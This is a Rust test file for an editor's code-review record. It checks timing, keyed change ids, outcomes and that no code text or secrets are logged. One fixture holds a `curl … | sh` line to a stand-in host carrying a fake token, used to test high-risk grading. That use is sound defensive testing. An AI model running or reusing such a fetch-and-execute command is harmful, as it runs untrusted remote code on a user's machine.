use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use super::*;
use crate::key::{Code, Key};

fn feed(ed: &mut Editor, keys: &str) {
    let mut chars = keys.chars();
    while let Some(c) = chars.next() {
        let key = if c == '<' {
            let name: String = chars.by_ref().take_while(|&c| c != '>').collect();
            name.parse().unwrap()
        } else {
            Key::plain(Code::Char(c))
        };
        ed.handle_key(key);
    }
}

/// A frame drawn, as the terminal would get it — what the record's time is counted from.
fn frame(ed: &mut Editor) {
    crate::term::render(ed, &mut Vec::new(), 120, 30).unwrap();
    // (a file in sight has its changes found on a worker: they land as the main loop would take them)
    let found = |ed: &Editor| ed.session.reviews.code.as_ref().is_none_or(|w| w.asked.is_empty());
    settle_until(ed, "the review's changes found", found);
}

fn settle_until(ed: &mut Editor, what: &str, done: impl Fn(&Editor) -> bool) {
    let end = Instant::now() + Duration::from_secs(10);
    while !done(ed) {
        assert!(Instant::now() < end, "{what}");
        if let Some(ev) = ed.events.recv_timeout(Duration::from_millis(20)) {
            ed.handle_event(ev);
        }
    }
}

/// The record as written: every entry, and the files' text whole.
fn record(dir: &Path) -> (Vec<Value>, String) {
    assert!(crate::cards::wait_written(Duration::from_secs(5)), "the record's writes ended");
    let mut text = String::new();
    for e in std::fs::read_dir(dir).into_iter().flatten().flatten() {
        if e.path().extension().is_some_and(|x| x == "jsonl") {
            text += &std::fs::read_to_string(e.path()).unwrap();
        }
    }
    (crate::cards::read_record(dir), text)
}

/// An editor on `file` (its text `text`) in a folder of its own, keeping the record in `<folder>/reviews`.
fn editor_on(name: &str, file: &str, text: &str) -> (Editor, PathBuf) {
    let dir = crate::scratch::Scratch::new(&format!("reviews-{name}")).into_path();
    let dir = std::fs::canonicalize(&dir).unwrap();
    std::fs::write(dir.join(file), text).unwrap();
    let mut ed = Editor::new(crate::config::Config::default());
    ed.session.root = dir.clone();
    ed.reviews_dir = Some(dir.join(DIR));
    ed.open(&dir.join(file)).unwrap();
    (ed, dir)
}

/// A change counts while it's on screen with you there: within `IDLE` after a key and within `IDLE` before
/// the next — five minutes on screen between two keys are 40 s, ten seconds of reading before a key are ten,
/// and what no key came near after the last one counts only its first `IDLE`.
#[test]
fn time_counts_only_with_you_there() {
    let t0 = Instant::now();
    let s = Duration::from_secs;
    let mut w = Watch::new(Of::Edit(1), "edit", t0, 0);
    let a = w.add("a.rs", ("x".into(), 0), (1, 1), 0..1);
    let b = w.add("a.rs", ("y".into(), 0), (1, 0), 4..4);
    w.input(t0);
    w.frame(t0, vec![a], Some(a));
    // (five minutes, no key: a frame drawn by something else in between changes nothing)
    w.frame(t0 + s(120), vec![a], Some(a));
    w.input(t0 + s(300));
    assert_eq!(w.changes[a].active, s(40), "20 s after the key, 20 s before the next — not 300");
    w.frame(t0 + s(300), vec![a, b], Some(b));
    w.input(t0 + s(310));
    assert_eq!((w.changes[a].active, w.changes[b].active), (s(50), s(10)), "10 s of reading before a key");
    assert_eq!(
        (w.changes[a].in_hand, w.changes[b].in_hand),
        (s(40), s(10)),
        "in hand: the one the cursor's in"
    );
    // (nobody since: 20 s after the last key, then nothing)
    w.frame(t0 + s(400), vec![], None);
    w.finish(t0 + s(500));
    assert_eq!((w.changes[a].active, w.changes[b].active), (s(70), s(30)), "20 s after the last key");
    assert_eq!(w.changes[b].in_hand, s(30));
    assert_eq!(w.active, s(70), "the review's own: any of it on screen with you there");
    assert_eq!(w.changes[b].drawn, Some(s(300)), "first on screen, from the review's start");
}

/// The record names a change by its file and an id — never its code: the lines an edit review showed, what
/// they became and what was asked are nowhere in it, though each change has its line, its id the hash of
/// its file and lines.
#[test]
fn the_record_holds_no_code_text() {
    let text = "fn zebra_secret() {}\nlet kiwi_hidden = 1;\n";
    let (mut ed, dir) = editor_on("no-code", "lib.rs", text);
    let id = ed.doc().id;
    let (one, two) = ("fn zebra_secret() {}\n", "let kiwi_hidden = 1;\n");
    let changes = vec![
        (0, one.len(), one.to_string(), "fn zebra_renamed() {}\n".to_string()),
        (one.len(), text.len(), two.to_string(), "let kiwi_hidden = 2;\n".to_string()),
    ];
    crate::llm::review_with(&mut ed, id, "rename the quokka_instruction", changes, None);
    frame(&mut ed);
    feed(&mut ed, "a");
    frame(&mut ed);
    assert!(ed.session.review.is_none(), "answered");
    let (entries, raw) = record(&dir.join(DIR));
    for word in ["zebra", "kiwi", "renamed", "hidden", "quokka", "fn ", "let "] {
        assert!(!raw.contains(word), "{word:?} is code — in the record:\n{raw}");
    }
    let changes: Vec<&Value> = entries.iter().filter(|e| e["entry"] == "change").collect();
    assert_eq!(changes.len(), 2, "{raw}");
    // (its id keyed with this machine's key: the plain hashes of the lines — tried against candidates, a
    // short change could be found again — are nowhere)
    let text = text_id("lib.rs", ["fn zebra_secret() {}"], ["fn zebra_renamed() {}"]);
    let plain = change_id(&text, 0);
    assert!(
        !raw.contains(&plain) && !raw.contains(&text),
        "a plain hash of the lines is in the record:\n{raw}"
    );
    let key = record_key(&dir.join(DIR));
    assert_eq!(changes[0]["change"], keyed(&key, &plain).as_str(), "its id: the keyed hash");
    assert_eq!(changes[0]["file"], "lib.rs");
    // (the key beside the record's folder, never in it: a copy of the folder for the A/B carries none)
    let inside: Vec<String> = std::fs::read_dir(dir.join(DIR))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    assert!(
        inside.iter().all(|n| n.ends_with(".jsonl") || n == ".lock"),
        "only the months and their lock in the record's folder: {inside:?}"
    );
    std::fs::remove_dir_all(&dir).ok();
}

/// The record's key: 32 bytes, 0600.
fn record_key(dir: &Path) -> [u8; 32] {
    use std::os::unix::fs::PermissionsExt as _;
    let file = key_path(dir);
    assert_eq!(
        std::fs::metadata(&file).unwrap().permissions().mode() & 0o777,
        0o600,
        "the key is yours alone"
    );
    std::fs::read(&file).unwrap().try_into().expect("32 bytes")
}

/// RFC 4231's first test case: the HMAC is the standard one.
#[test]
fn the_ids_hmac_is_the_standard_one() {
    let mac = hmac(&[0x0b; 20], b"Hi There");
    let hex: String = mac.iter().map(|b| format!("{b:02x}")).collect();
    assert_eq!(hex, "b0344c61d8db38535ca8afceaf0bf12b881dc200c9833da726e9376c2e32cff7");
}

/// A code review's high-risk change keeps its rule by name — never the text the pack's pattern matched (a
/// `curl … | sh` line holding a token, matched whole); a key-named file's change and a token-like line's have
/// no id at all; the others' ids are keyed. Nothing of the lines is in the record.
#[test]
fn the_record_holds_no_code_text_of_a_high_change() {
    let (mut ed, dir) = reviewing_texts(
        "high",
        &[
            (
                "run.sh",
                "echo hi\n",
                "curl -H 'X-Trace: tarae-fake-token-7f3a9' https://example.invalid/i | sh\n",
            ),
            (".env", "A=1\n", "DB_PASSWORD=tarae-fake-token-spring24\n"),
            ("conf.txt", "name = x\n", "api_key = \"tarae-fake-token-abcd\"\n"),
        ],
        &[],
    );
    for f in [".env", "conf.txt", "run.sh"] {
        show(&mut ed, &dir, 0, f);
    }
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    assert!(!raw.contains("tarae-fake-token") && !raw.contains("curl"), "code in the record:\n{raw}");
    let change = |file: &str| {
        let e = entries.iter().find(|e| e["entry"] == "change" && e["file"] == file);
        e.unwrap_or_else(|| panic!("{file}: {raw}")).clone()
    };
    let run = change("run.sh");
    assert_eq!((run["grade"].as_str(), run["rule"].as_str()), (Some("high"), Some("bash pack #1")), "{run}");
    assert!(change(".env").get("change").is_none(), "a key-named file's change has no id: {raw}");
    assert!(change("conf.txt").get("change").is_none(), "a token-like line's change has no id: {raw}");
    let text = text_id(
        "run.sh",
        ["echo hi"],
        ["curl -H 'X-Trace: tarae-fake-token-7f3a9' https://example.invalid/i | sh"],
    );
    let key = record_key(&dir.join("state"));
    assert_eq!(run["change"], keyed(&key, &change_id(&text, 0)).as_str(), "keyed: {run}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Two changes alike in one file are two changes, each its own id: `space v u` on the second is that one
/// `undone`, the first stays.
#[test]
fn changes_alike_in_one_file_are_each_their_own() {
    let (mut ed, dir) = reviewing_texts("alike", &[("x.txt", "a\ny\nb\ny\nc\n", "a\nx\nb\nx\nc\n")], &[]);
    feed(&mut ed, "jj");
    frame(&mut ed);
    assert_eq!(ed.cursor_line(), 3, "on the second");
    feed(&mut ed, "<space>vu");
    ed.git_schedule();
    settle_until(&mut ed, "the diff after the undo", |ed| ed.doc().git_version == ed.doc().version());
    frame(&mut ed);
    assert_eq!(ed.doc().text.to_string(), "a\nx\nb\ny\nc\n", "the second taken back");
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let changes: Vec<&Value> = entries.iter().filter(|e| e["entry"] == "change").collect();
    assert_eq!(changes.len(), 2, "{raw}");
    assert_ne!(changes[0]["change"], changes[1]["change"], "each its own id: {raw}");
    let mut outcomes: Vec<&str> = changes.iter().map(|e| e["outcome"].as_str().unwrap()).collect();
    crate::sorting::sort(&mut outcomes);
    assert_eq!(outcomes, ["left", "undone"], "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A review's id is this tarae's — its start and pid — and a count: `:restart` keeps the pid and starts the count
/// again, never the time, so no two taraes' reviews share one.
#[test]
fn review_ids_differ_across_restarts() {
    let w = Watch::new(Of::Edit(1), "edit", Instant::now(), 0);
    let ms = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis();
    let (tag, _) = w.id.trim_start_matches('r').split_once('-').expect("r<tag>-<n>");
    let (started, pid) = tag.split_once('.').expect("<start>.<pid>");
    let started = u128::from_str_radix(started, 16).expect("the start, in hex ms");
    assert!(started <= ms && ms - started < 3_600_000, "this tarae's start: {}", w.id);
    assert_eq!(pid, std::process::id().to_string());
    assert_ne!(review_id("18f.42", 1), review_id("190.42", 1), "the same pid and count, another start");
}

/// An edit review answered key by key, frames between: a line per change — its file, counts, when first
/// drawn, its times and your answer — then the review's.
#[test]
fn an_edit_review_writes_a_line_per_change_and_its_own() {
    let (mut ed, dir) = editor_on("edit", "a.txt", "one\ntwo\n");
    let id = ed.doc().id;
    let changes =
        vec![(0, 4, "one\n".to_string(), "ONE\n".to_string()), (4, 8, "two\n".into(), "TWO\n".into())];
    crate::llm::review_with(&mut ed, id, "upper", changes, None);
    frame(&mut ed);
    let run = Run::of(&ed, &ed.session, true).expect("the state has it");
    assert_eq!((run.kind, run.changes, run.decided), ("edit", 2, 0));
    feed(&mut ed, "y");
    frame(&mut ed);
    assert_eq!(Run::of(&ed, &ed.session, true).map(|r| r.decided), Some(1), "one answered");
    feed(&mut ed, "n");
    frame(&mut ed);
    assert!(ed.session.review.is_none() && ed.session.reviews.edit.is_none(), "over");
    let (entries, raw) = record(&dir.join(DIR));
    let kinds: Vec<(&str, &str)> =
        entries.iter().map(|e| (e["entry"].as_str().unwrap(), e["outcome"].as_str().unwrap_or(""))).collect();
    assert_eq!(kinds, [("change", "accepted"), ("change", "rejected"), ("review", "")], "{raw}");
    let first = &entries[0];
    assert_eq!((first["kind"].as_str(), first["file"].as_str()), (Some("edit"), Some("a.txt")));
    assert_eq!(first["lines"], json!({ "added": 1, "removed": 1 }));
    assert_eq!(
        (&first["lens"], &entries[2]["lens"]),
        (&json!([]), &json!([])),
        "the A/B's arm, empty: {raw}"
    );
    assert!(
        first["drawn_ms"].is_u64() && first["active_ms"].is_u64() && first["in_hand_ms"].is_u64(),
        "{first}"
    );
    assert_eq!(entries[2]["changes"], 2);
    assert!(entries.iter().all(|e| e["review"] == entries[0]["review"]), "one review's");
    std::fs::remove_dir_all(&dir).ok();
}

/// The review open on file `path`, its diff there.
fn landed_on(ed: &Editor, path: &Path) -> bool {
    let d = ed.doc();
    ed.session.code_review.is_some()
        && d.review_base.is_some()
        && d.git_version == d.version()
        && d.path.as_deref() == Some(path)
}

/// A code review of the uncommitted changes in a repository of `files` (each one line, committed lowercase,
/// changed to uppercase) — `risky` its `review.risky` — open on the first file, a frame drawn; the record in
/// `<repo>/state`.
fn reviewing(name: &str, files: &[&str], risky: &[&str]) -> (Editor, PathBuf) {
    let texts: Vec<(String, String, String)> =
        files.iter().map(|f| (f.to_string(), format!("{f} one\n"), format!("{f} ONE\n"))).collect();
    let texts: Vec<(&str, &str, &str)> =
        texts.iter().map(|(f, a, b)| (f.as_str(), a.as_str(), b.as_str())).collect();
    reviewing_texts(name, &texts, risky)
}

/// Inside zellij, a card stepped aside while the review's rail has the keys (as a bring card's `h` leaves it —
/// `codereview::aside_said`): `C-q`'s twin is the rail's way back, `esc`, then the inbox — and those keys give the
/// card the keys again.
#[test]
fn inside_zellij_an_aside_card_from_the_rail_is_the_inboxs() {
    let (mut ed, dir) = reviewing_texts("zellij-rail", &[("a.txt", "a\n", "b\n")], &[]);
    ed.zellij = true;
    // (the review opens in the code; `space e` in a review gives its rail the keys — `sidebar_show`)
    for k in ["space", "e"] {
        ed.handle_key(k.parse().unwrap());
    }
    frame(&mut ed);
    assert_eq!(ed.keys_to().region, crate::uistate::Region::Rail, "space e: the rail");
    let what = crate::offer::What::Screen { call: crate::tools::Call::test(1) };
    ed.push_offer(crate::offer::Offer::new(
        "Claude asks".into(),
        "to see the screen",
        "",
        String::new(),
        what,
    ));
    ed.offers[0].aside = true;
    frame(&mut ed);
    assert_eq!(ed.key_said("C-q"), "esc space I");
    for k in ["esc", "space", "I", "ret"] {
        ed.handle_key(k.parse().unwrap());
        frame(&mut ed);
    }
    assert!(ed.card_has_keys(), "{:?} {:?}", ed.keys_to().region, ed.status);
    std::fs::remove_dir_all(&dir).ok();
}

/// A bring's high-risk change shown in the review open (`codereview::held_go`, as its card's `h` does): the status
/// line says how back to the card — `C-q`, inside zellij its twin.
#[test]
fn inside_zellij_or_not_a_brings_change_in_the_review_says_the_way_back_to_its_card() {
    for zellij in [false, true] {
        let (mut ed, dir) = reviewing(&format!("zellij-held-{zellij}"), &["a.txt"], &["a.txt"]);
        ed.zellij = zellij;
        let r = ed.session.code_review.as_ref().expect("the review");
        let graded = r.graded(&ed, &r.files[0]);
        let high = graded.iter().find(|g| g.grade == crate::risk::Grade::High).expect("a high-risk change");
        let held = crate::codereview::Held {
            rel: "a.txt".into(),
            at: 0,
            lines: 1,
            why: "risky".into(),
            removed: Vec::new(),
            added: Vec::new(),
            mode: None,
            keys: high.keys.clone(),
            size: None,
        };
        crate::codereview::held_go(&mut ed, 7, &[held]);
        let key = if zellij { "space I" } else { "C-q" };
        let status = ed.status.as_ref().map(|s| s.0.clone()).unwrap_or_default();
        assert!(
            status.ends_with(&format!("space v h looks at it · {key} goes back to the card")),
            "{status}"
        );
        std::fs::remove_dir_all(&dir).ok();
    }
}

/// `reviewing` with each file's (name, committed text, text now).
fn reviewing_texts(name: &str, files: &[(&str, &str, &str)], risky: &[&str]) -> (Editor, PathBuf) {
    let (mut ed, dir) = repo(name, files, risky);
    open_review(&mut ed, &dir, files);
    (ed, dir)
}

/// The review of `files` in `dir` opened in the session in front, on the first file, a frame drawn.
fn open_review(ed: &mut Editor, dir: &Path, files: &[(&str, &str, &str)]) {
    crate::codereview::start_in(ed, dir.to_path_buf(), None);
    settle_until(ed, "the review opens", |ed| {
        ed.session.code_review.is_some() && files.iter().any(|f| landed_on(ed, &dir.join(f.0)))
    });
    frame(ed);
}

/// A repository of `files` (name, committed text, text now) and an editor whose review would grade `risky`,
/// keeping the record in `<repo>/state` — no review open.
fn repo(name: &str, files: &[(&str, &str, &str)], risky: &[&str]) -> (Editor, PathBuf) {
    let dir = crate::scratch::Scratch::new(&format!("reviews-{name}")).into_path();
    let dir = std::fs::canonicalize(&dir).unwrap();
    // (none of the user's git settings — a global ignore leaving `.env` out, its default place too — and no
    // hooks: `test_git`)
    let git = |args: &[&str]| {
        let ok = test_git(&dir).args(args).output();
        assert!(ok.unwrap().status.success(), "git {args:?}");
    };
    git(&["init", "-q"]);
    for (f, then, _) in files {
        std::fs::write(dir.join(f), then).unwrap();
    }
    git(&["add", "."]);
    git(&["commit", "-qm", "x"]);
    for (f, _, now) in files {
        std::fs::write(dir.join(f), now).unwrap();
    }
    let mut config = crate::config::Config::default();
    config.editor.review_risky = risky.iter().map(|r| r.to_string()).collect();
    let mut ed = Editor::new(config);
    ed.reviews_dir = Some(dir.join("state"));
    (ed, dir)
}

/// git in `dir` reading none of the user's settings: no global or system config, and no global ignore or
/// attributes in their default place either (`$XDG_CONFIG_HOME/git/`, else `~/.config/git/` — read with no
/// config at all; under `/dev/null` there's nothing to read), no hooks, a committer of its own.
fn test_git(dir: &Path) -> std::process::Command {
    let mut git = std::process::Command::new("git");
    git.args(["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false"])
        .args(["-c", "core.hooksPath=/dev/null"])
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("XDG_CONFIG_HOME", "/dev/null")
        .current_dir(dir);
    git
}

/// File `name` of the review open, its diff there, a frame drawn (`_i`: where the caller thinks it is).
fn show(ed: &mut Editor, dir: &Path, _i: usize, name: &str) {
    let path = dir.join(name);
    let files = &ed.session.code_review.as_ref().expect("a review").files;
    let i = files.iter().position(|f| f.path == path).expect("one of its files");
    crate::codereview::show(ed, i, false);
    settle_until(ed, name, |ed| landed_on(ed, &path));
    frame(ed);
}

/// A code review of the uncommitted changes: the change taken back with `space v u` is `undone`, the file
/// marked viewed with `space v m` `viewed`; the review's line counts every change it had.
#[test]
fn a_code_review_writes_what_each_change_ended_as() {
    let (mut ed, dir) = reviewing("code", &["a.txt", "b.txt"], &[]);
    assert_eq!(ed.doc().path.as_deref(), Some(dir.join("a.txt").as_path()));
    let run = Run::of(&ed, &ed.session, true).expect("the state has it");
    assert_eq!((run.kind, run.changes), ("uncommitted", 1));
    assert_eq!(run.in_hand.as_ref().map(|h| (h.0.as_str(), h.1)), Some(("a.txt", 1)), "the change in hand");
    feed(&mut ed, "<space>vu");
    // (the diff is redone after an event — the main loop's turn)
    ed.git_schedule();
    settle_until(&mut ed, "its diff after the undo", |ed| ed.doc().git_version == ed.doc().version());
    frame(&mut ed);
    show(&mut ed, &dir, 1, "b.txt");
    feed(&mut ed, "<space>vm");
    frame(&mut ed);
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let outcome = |file: &str| {
        let e = entries.iter().find(|e| e["entry"] == "change" && e["file"] == file);
        e.map(|e| e["outcome"].as_str().unwrap_or_default().to_string())
    };
    assert_eq!(outcome("a.txt").as_deref(), Some("undone"), "{raw}");
    assert_eq!(outcome("b.txt").as_deref(), Some("viewed"), "{raw}");
    let review = entries.iter().find(|e| e["entry"] == "review").expect("the review's line");
    assert_eq!(
        (review["kind"].as_str(), review["changes"].as_u64()),
        (Some("uncommitted"), Some(2)),
        "{raw}"
    );
    assert_eq!(review["total"].as_u64(), Some(1), "the changes it had as it ended: a.txt's went");
    let kept = |e: &&Value| e["entry"] == "change" && e["outcome"] != "undone";
    assert!(entries.iter().filter(kept).all(|e| e["grade"].is_string()), "graded: {raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// `tarae state` says the review under way (`sessions[].review`, a `review` line) — never to Claude — and
/// `--watch review` hears it begin, each change answered, and its end with the outcomes.
#[test]
fn the_state_says_the_review_and_a_watch_hears_it() {
    let (mut ed, dir) = editor_on("state", "a.txt", "one\ntwo\n");
    let (tx, rx) = std::sync::mpsc::sync_channel(crate::uistate::watch::UNREAD);
    let flag = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    ed.ui_watch_add(crate::uistate::watch::Watcher { tx, kinds: vec!["review".into()], overflowed: flag });
    let heard = |ed: &mut Editor| -> Vec<String> {
        frame(ed);
        let evs: Vec<Value> = rx.try_iter().map(|l| serde_json::from_str(&l).unwrap()).collect();
        assert!(evs.iter().all(|e| e["event"] == "review"), "{evs:?}");
        evs.iter().map(|e| e["said"].as_str().unwrap().to_string()).collect()
    };
    let id = ed.doc().id;
    let changes =
        vec![(0, 4, "one\n".to_string(), "ONE\n".to_string()), (4, 8, "two\n".into(), "TWO\n".into())];
    crate::llm::review_with(&mut ed, id, "upper", changes, None);
    let began = heard(&mut ed);
    assert!(began.len() == 1 && began[0].ends_with("review began (edit)"), "{began:?}");
    let state = ed.ui_state();
    let text = state.text();
    assert!(text.contains(": edit · 2 changes · 0 decided · active "), "{text}");
    assert!(text.contains("in hand a.txt:1"), "{text}");
    let json = state.json();
    assert_eq!(json["sessions"][0]["review"]["kind"], "edit", "{json}");
    let claudes = ed.ui_state_claude();
    assert!(claudes.sessions.iter().all(|s| s.review.is_none()), "Claude's level never has it");
    feed(&mut ed, "y");
    let decided = heard(&mut ed);
    assert!(
        decided.len() == 1 && decided[0].ends_with(": review — a.txt change 1 of 2 accepted"),
        "{decided:?}"
    );
    feed(&mut ed, "n");
    let ended = heard(&mut ed);
    assert_eq!(ended.len(), 1, "{ended:?}");
    assert!(
        ended[0].contains("review ended (edit) — 2 changes, ")
            && ended[0].ends_with(": 1 accepted · 1 rejected")
    );
    std::fs::remove_dir_all(&dir).ok();
}

/// The other ends of a code review's change: a change you typed in is `edited`, one you drafted a comment on
/// `commented`, a high-risk one looked at (`space v h`) `looked` with its grade and rule — and the reviewer's
/// finding on a change is that change's `finding` and a line of its own, sent or not, never its words.
#[test]
fn a_code_review_writes_edited_commented_looked_and_its_findings() {
    let (mut ed, dir) = reviewing("ends", &["a.txt", "b.txt", "c.txt", "d.txt"], &["c.txt"]);
    // (a.txt: typed into, on its changed line)
    feed(&mut ed, "iX<esc>");
    ed.git_schedule();
    settle_until(&mut ed, "a.txt's diff after the edit", |ed| ed.doc().git_version == ed.doc().version());
    frame(&mut ed);
    show(&mut ed, &dir, 1, "b.txt");
    crate::notes::add(&mut ed, &dir.join("b.txt"), 0..1, crate::notes::By::You, "why upper-case-wombat?");
    show(&mut ed, &dir, 2, "c.txt");
    feed(&mut ed, "<space>vh");
    frame(&mut ed);
    show(&mut ed, &dir, 3, "d.txt");
    let id = crate::notes::add(
        &mut ed,
        &dir.join("d.txt"),
        0..1,
        crate::notes::By::Reviewer,
        "a numbat-shaped bug",
    );
    ed.session.notes.list.iter_mut().filter(|n| n.id == id).for_each(|n| n.thread[0].draft = true);
    let done = crate::reviewer::State::Done;
    let mut rv = crate::reviewer::Reviewer::for_test(dir.clone(), done, vec![id], "ok");
    // (it read for this review: its findings go to this one's record)
    rv.review = ed.session.code_review.as_ref().map(|r| r.started);
    ed.session.reviewer = Some(rv);
    crate::codereview::close(&mut ed);
    let (entries, raw) = record(&dir.join("state"));
    let change = |file: &str| {
        entries
            .iter()
            .find(|e| e["entry"] == "change" && e["file"] == file)
            .unwrap_or_else(|| panic!("{file}: {raw}"))
    };
    assert_eq!(change("a.txt")["outcome"], "edited", "{raw}");
    assert_eq!(change("a.txt")["edited"], true);
    assert_eq!(change("b.txt")["outcome"], "commented", "{raw}");
    let c = change("c.txt");
    assert_eq!((c["outcome"].as_str(), c["grade"].as_str()), (Some("looked"), Some("high")), "{raw}");
    assert!(c["rule"].as_str().is_some_and(|r| !r.is_empty()), "the rule that made it high: {c}");
    let d = change("d.txt");
    assert_eq!((d["outcome"].as_str(), d["finding"].as_bool()), (Some("left"), Some(true)), "{raw}");
    let found: Vec<&Value> = entries.iter().filter(|e| e["entry"] == "finding").collect();
    assert_eq!(found.len(), 1, "{raw}");
    assert_eq!(
        (found[0]["file"].as_str(), &found[0]["change"]),
        (Some("d.txt"), &d["change"]),
        "on d's change"
    );
    assert_eq!(found[0]["finding"], json!({ "by": "reviewer", "sent": false, "answered": false }));
    for words in ["wombat", "numbat", "ONE"] {
        assert!(!raw.contains(words), "{words:?} — a note's or the code's words — in the record:\n{raw}");
    }
    std::fs::remove_dir_all(&dir).ok();
}

/// An edit review closed rather than answered (cancelled, or another review in its place: nothing applied)
/// records each change `left` — a `y` before the close never landed.
#[test]
fn a_closed_edit_review_records_its_changes_left() {
    let (mut ed, dir) = editor_on("closed", "a.txt", "one\ntwo\n");
    let id = ed.doc().id;
    let changes =
        vec![(0, 4, "one\n".to_string(), "ONE\n".to_string()), (4, 8, "two\n".into(), "TWO\n".into())];
    crate::llm::review_with(&mut ed, id, "upper", changes, None);
    frame(&mut ed);
    feed(&mut ed, "y");
    frame(&mut ed);
    crate::llm::close_review(&mut ed);
    assert_eq!(ed.doc().text.to_string(), "one\ntwo\n", "nothing applied");
    let (entries, raw) = record(&dir.join(DIR));
    let outcomes: Vec<&str> =
        entries.iter().filter(|e| e["entry"] == "change").map(|e| e["outcome"].as_str().unwrap()).collect();
    assert_eq!(outcomes, ["left", "left"], "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A review whose session goes behind stops counting: the time spent in another session isn't its — not after
/// the last key there, not before the first key back.
#[test]
fn time_in_another_session_isnt_counted() {
    let t0 = Instant::now();
    let s = Duration::from_secs;
    let mut w = Watch::new(Of::Edit(1), "edit", t0, 0);
    let a = w.add("a.rs", ("x".into(), 0), (1, 1), 0..1);
    w.frame(t0, vec![a], Some(a));
    w.input(t0 + s(1));
    // (the key that switched sessions, then the frame of the other one)
    w.input(t0 + s(2));
    w.pause(t0 + s(2));
    // back after five minutes: a frame, then ten seconds of reading and a key
    w.frame(t0 + s(300), vec![a], Some(a));
    w.frame(t0 + s(300), vec![a], Some(a));
    w.input(t0 + s(310));
    assert_eq!(w.changes[a].active, s(12), "2 s before it went, 10 s after it came back");

    // In the editor: the session behind has its review paused at the next frame
    let (mut ed, dir) = editor_on("behind", "a.txt", "one\n");
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "upper", vec![(0, 4, "one\n".into(), "ONE\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "j");
    frame(&mut ed);
    let mine = ed.session.id;
    let other = ed.session_add(dir.clone());
    ed.session_switch(other);
    frame(&mut ed);
    let behind = ed.sessions.iter().find(|l| l.id == mine).expect("behind");
    let w = behind.reviews.edit.as_ref().expect("its review's watch");
    assert!(w.mark.is_none() && w.shown.is_empty() && w.last_input.is_none(), "paused: {w:?}");
    std::fs::remove_dir_all(&dir).ok();
}

/// Quitting keeps every review under way as it stands: the front session's edit review — `left`, a `y` too:
/// quitting applies nothing — and a session's behind; two writes at once, both kept (the first makes the
/// record's secret).
#[test]
fn quitting_keeps_the_reviews_under_way() {
    let (mut ed, dir) = editor_on("quit", "a.txt", "one\ntwo\n");
    let id = ed.doc().id;
    let changes =
        vec![(0, 4, "one\n".to_string(), "ONE\n".to_string()), (4, 8, "two\n".into(), "TWO\n".into())];
    crate::llm::review_with(&mut ed, id, "upper", changes, None);
    frame(&mut ed);
    feed(&mut ed, "y");
    frame(&mut ed);
    let other = ed.session_add(dir.clone());
    let l = ed.sessions.iter_mut().find(|l| l.id == other).unwrap();
    let mut w = Watch::new(Of::Code(Instant::now()), "branch", Instant::now(), 0);
    w.add("b.rs", ("b1".into(), 0), (2, 0), 0..2);
    l.reviews.code = Some(w);
    ed.reviews_flush();
    let (entries, raw) = record(&dir.join(DIR));
    // (two writes, on two workers: in either order)
    let mut changes: Vec<(&str, &str)> = entries
        .iter()
        .filter(|e| e["entry"] == "change")
        .map(|e| (e["file"].as_str().unwrap(), e["outcome"].as_str().unwrap()))
        .collect();
    crate::sorting::sort(&mut changes);
    assert_eq!(changes, [("a.txt", "left"), ("a.txt", "left"), ("b.rs", "left")], "{raw}");
    assert_eq!(entries.iter().filter(|e| e["entry"] == "review").count(), 2, "{raw}");
    std::fs::remove_dir_all(&dir).ok();
}

/// A reviewer's finding is a line of its own: its file, the change it's on, and its `finding` object whole —
/// `false` kept, the room a review panel's lens, skeptic and outcome go in; never what it says.
#[test]
fn a_finding_is_a_line_with_its_own_object() {
    let mut w = Watch::new(Of::Code(Instant::now()), "turn", Instant::now(), 0);
    w.add("a.rs", ("c1".into(), 0), (1, 0), 3..4);
    let mut finding = serde_json::Map::new();
    finding.insert("by".into(), json!("reviewer"));
    finding.insert("sent".into(), json!(false));
    w.findings.push(Finding { file: "a.rs".into(), change: Some("c1".into()), finding });
    w.findings.push(Finding { file: "b.rs".into(), change: None, finding: Default::default() });
    let e = entries(&w, "main", std::time::SystemTime::now(), Some((2, 1)));
    let kinds: Vec<&str> = e.iter().map(|e| e["entry"].as_str().unwrap()).collect();
    assert_eq!(kinds, ["change", "finding", "finding", "review"]);
    assert_eq!((e[1]["file"].as_str(), e[1]["change"].as_str()), (Some("a.rs"), Some("c1")));
    assert_eq!(e[1]["finding"], json!({ "by": "reviewer", "sent": false }), "whole, false kept");
    assert!(e[2].get("change").is_none() && e[2]["finding"] == json!({}), "on no change: {}", e[2]);
    assert_eq!((e[3]["findings"].as_u64(), e[3]["unsent"].as_u64()), (Some(2), Some(1)));
}

/// `review.record` off: nothing is written.
#[test]
fn review_record_off_writes_nothing() {
    let (mut ed, dir) = editor_on("off", "a.txt", "one\n");
    ed.config.review_record = false;
    let id = ed.doc().id;
    crate::llm::review_with(&mut ed, id, "upper", vec![(0, 4, "one\n".into(), "ONE\n".into())], None);
    frame(&mut ed);
    feed(&mut ed, "y");
    let (entries, _) = record(&dir.join(DIR));
    assert!(entries.is_empty(), "{entries:?}");
    std::fs::remove_dir_all(&dir).ok();
}

fn changes_in(entries: &[Value]) -> Vec<&Value> {
    entries.iter().filter(|e| e["entry"] == "change").collect()
}

/// The diff read again after a key, a frame drawn.
fn rediffed(ed: &mut Editor, what: &str) {
    ed.git_schedule();
    settle_until(ed, what, |ed| ed.doc().git_version == ed.doc().version());
    frame(ed);
}

/// A file named like a key outside the session's checkout is one by its name alone: its change has no id —
/// `PASS=abc` is too short to look like a token, and a keyed id of it could be tried against candidates.
#[test]
fn a_key_named_file_outside_the_checkout_has_no_id() {
